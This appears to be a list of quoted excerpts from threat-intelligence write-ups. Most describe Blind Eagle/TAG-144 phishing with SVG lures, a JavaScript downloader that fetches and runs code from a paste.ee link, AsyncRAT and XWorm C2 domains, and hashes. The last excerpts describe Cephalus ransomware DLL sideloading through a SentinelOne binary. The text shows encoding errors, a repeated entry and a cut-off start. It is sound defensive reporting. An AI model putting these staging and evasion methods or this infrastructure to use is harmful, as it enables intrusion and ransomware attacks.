which translates to ‚ÄúAdd the commands‚Äù), a characteristic previously observed in connection with Blind Eagle (1, 2).",
" In addition to the Spanish-themed domains, Insikt Group identified a large set of DuckDNS and CON-IP domains, likely generated by another DGA algorithm and all starting with the keyword ‚Äúdeadpoolstart,‚Äù followed by a four-digit number (see Appendix E). Notably, the con-ip[.]com domains resolve to the AS-COLOCROSSING IP address 64[.]188[.]9[.]172, while the duckdns[.]org domains all resolve to IP addresses belonging to Colombian ISPs. Abuse of Legitimate Internet Services Similar to Cluster 1, Cluster 2 has also been observed leveraging various LIS during staging, including GitHub, Archive, Paste.ee, and more recently, the free hosting platform lovestoblog[.]com by InfinityFree, which ultimately led to an XWorm infection using the C2 domain deadpoolstart2064[.]duckdns[.]org. Insikt Group also identified a payload named RELACI√ìN DE SALDOS - CUENTA DE COBRO.pdf.exe associated with Cluster 2, which staged its content via two GitHub Gist URLs linked to the account SmikeY666: hxxps://gist[.]githubusercontent[.]com/SmikeY666/50447c53097f8884ffc754a8779fa2a3/raw hxxps://gist[.]githubusercontent[.]com/SmikeY666/8504274482e8e688d9489b302bfbc45e/raw The payload results in an AsyncRAT infection, with the malware reaching out to its C2 server, cococovid202420242024[.]duckdns[.]org, which resolved to IP address 64[.]188[.]9[.]175 as of December 26, 2024. ",
"Subject: Collection of late payment interest ‚Äì File 11001-28-05-03004 Caution! This email is from an external user. Do not open attachments or click on links without verifying that the sender and content are secure. Never provide your username or password through links. A lawsuit has been filed for interest accrued due to late payment. See the file for detailed settlement. Sincerely, Figure 7: Text in phishing email linked to TAG-144 (left) and the English translation (right) (Source: Recorded Future) SVG Attachment The email included an attachment named Notificacion_electronica_sentencia_preliminar_Departamento_Juridico_sxyebfiv.svg, which has a SHA256 hash of 04878a5889e3368c2cf093d42006ba18a87c5054f1464900094e6864f4919899. A translated version of the attachment is presented in Figure 8, while the original Spanish version is available in Appendix J. The SVG content claims that a judicial process has been initiated against the recipient, outlines potential penalties, and contains a link purportedly leading to evidence and further legal details. Figure 8: Translated SVG file sent via spearphishing email (Source: Recorded Future) Staging Process Using LIS The link embedded within the SVG file is: hxxps://cdn[.]discordapp[.]com/attachments/1389692690454548634/1389692792590307338/Notificacion_electronica_sentencia_preliminar_Departamento_De-Justicia_01.js?ex=68658bc4&is=68643a44&hm=057a0e76212bdd4c2da95e51ac7542f60ecbd440482ee186d474e1d783afd288&?id=75e6ea37-63e5-491a-a5e2-ad4c92667144 A similar SVG sample was identified through a Malware Intelligence search for HTTP requests to cdn[.]discordapp[.]com that included ‚ÄúNotificacion‚Äù in the query string (see Figure 9). Figure 9: Additional sample found in Recorded Future Malware Intelligence (Source: Recorded Future) Although the cdn[.]discordapp[.]com link was inactive at the time of analysis, Insikt Group successfully extracted the downloaded JavaScript file from a PCAP capture. The file, named Notificacion_electronica_sentencia_preliminar_Departamento_De-Justicia_01.js, has the SHA256 hash 1226a8d066328a8b6f353c9d98f1dc8128bd84f3909ae1cc6811dc1adff33c81. The script contains a mix of malicious code and benign content related to the Microsoft Print Schema. The benign portion is displayed in Figure 10. The inclusion of benign content is likely an attempt to evade detection. Figure 10: Benign code portion contained in the JavaScript script (Source: Recorded Future) Obfuscation Figure 11 shows the obfuscated malicious portion of the script. Notably, the code contains comments written in Portuguese, an aspect previously discussed in this report and also associated with activity linked to TAG-144. Figure 11: Obfuscated malicious code portion contained in the JavaScript script (Source: Recorded Future) The variables voicelessness and classe, unwellness, and isostasy are obfuscated using junk characters and later deobfuscated via string replacement operations. These variables resolve to the following: voicelessness and classe: MSXML2.ServerXMLHTTP.6.0 unwellness: hxxp://paste[.]ee/d/TrxwtHcC/0 (as observed via URLScan) isostasy: GET The script creates a ServerXMLHTTP object and issues a GET request to the specified paste[.]ee URL using the custom User-Agent MyCustomAgent/1.0. If the HTTP response returns a status code 200, the response body is executed as JavaScript. The SHA256 hash of the response body is 591744244c7ca9cea69cde263187efde3f65a157f8e5eb885ccc1f9e078b5572. This payload contains similar string obfuscation techniques and ultimately reconstructs strings to instantiate a shell object and execute a deobfuscated command line.",
"Perhaps the most interesting part of the Cephalus incidents is that they used a unique process for launching the ransomware itself, which involved sideloading a dynamic link library (DLL) via a legitimate SentinelOne executable file ( SentinelBrowserNativeHost.exe ), and then loading a data.bin file via the DLL that contains the actual ransomware code. ",
"SentinelBrowserNativeHost.exe , a legitimate SentinelOne executable, was launched from the user‚Äôs Downloads folder, which then loaded SentinelAgentCore.dll . From this, data.bin was subsequently loaded. Huntress analysts were unable to collect a copy of the data.bin file from the endpoint. On the endpoint where the ransomware was successfully launched, the following command line initiated the process: C:\Users\[user]\Downloads\SentinelBrowserNativeHost.exe Of particular note is that both impacted organizations ran legitimate instances of SentinelOne . During both incidents, the SentinelBrowserNativeHost.exe file was found in the compromised user‚Äôs Downloads folder. ",
"On the endpoint where the ransomware was successfully launched, the following command line initiated the process: C:\Users\[user]\Downloads\SentinelBrowserNativeHost.exe Of particular note is that both impacted organizations ran legitimate instances of SentinelOne . During both incidents, the SentinelBrowserNativeHost.exe file was found in the compromised user‚Äôs Downloads folder.",